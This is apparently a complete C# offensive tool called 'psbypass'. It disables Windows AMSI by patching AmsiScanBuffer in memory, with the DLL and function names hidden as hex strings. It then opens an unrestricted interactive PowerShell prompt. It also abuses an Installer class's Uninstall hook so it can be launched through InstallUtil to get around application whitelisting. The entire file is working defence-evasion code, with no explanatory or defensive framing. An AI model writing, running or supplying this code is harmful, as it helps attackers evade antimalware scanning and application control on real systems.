using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Linq;
using System.Collections.Generic;

namespace psbypass
{
    class Program
    {
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static string FromHexBuffer(String hexdata)
        {
            string buffer = "";
            String[] hexbuffersplit = hexdata.Split(';');
            foreach (String hex in hexbuffersplit)
            {
                int value = Convert.ToInt32(hex, 16);
                buffer += Char.ConvertFromUtf32(value);
            }

            return buffer;
        }
        public static int Bypass()
        {
            //https[:]//iwantmore.pizza/posts/amsi.html
            string hexbuffer = "41;6d;73;69;53;63;61;6e;42;75;66;66;65;72";
            string hexdllbuffer = "61;6d;73;69;2e;64;6c;6c";

            string buf1 = FromHexBuffer(hexdllbuffer);
            string buf2 = FromHexBuffer(hexbuffer);
            IntPtr Address = GetProcAddress(LoadLibrary(buf1), buf2);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            byte c1 = 0xB8, c2 = 0x80;

            Byte[] Patch = { c1, 0x57, 0x00, 0x07, c2, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            Console.WriteLine("Reached here!");
            return 0;

        }
        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }

        private static void runCommand(PowerShell ps, string cmd)
        {
            ps.AddScript(cmd);
            ps.AddCommand("Out-String");
            var results = ps.Invoke();

            if (ps.Streams.Error.Count > 0)
            {
                foreach (var error in ps.Streams.Error)
                {
                    Console.WriteLine(error.ToString());
                }
            }
            else
            {
                foreach (var result in results)
                {
                    Console.WriteLine(result.ToString());
                }
            }

            ps.Commands.Clear();
        }

        private static StringBuilder buildOutput(Collection<PSObject> results)
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }

            return stringBuilder;
        }

        public static void Main()
        {
            Bypass();


            //https[:]//github.com/dotnet/runtime/issues/29029
            const int BufferSize = 2600;
            Console.SetIn(new StreamReader(Console.OpenStandardInput(), Encoding.UTF8, false, BufferSize));
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;

                    while (true)
                    {
                        Console.Write("psHell " + Directory.GetCurrentDirectory() + ">");
                        string cmd = Console.ReadLine();

                        if (cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                            break;

                        runCommand(ps, cmd);
                    }
                }
            }
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Program.Main();
        }
    }
}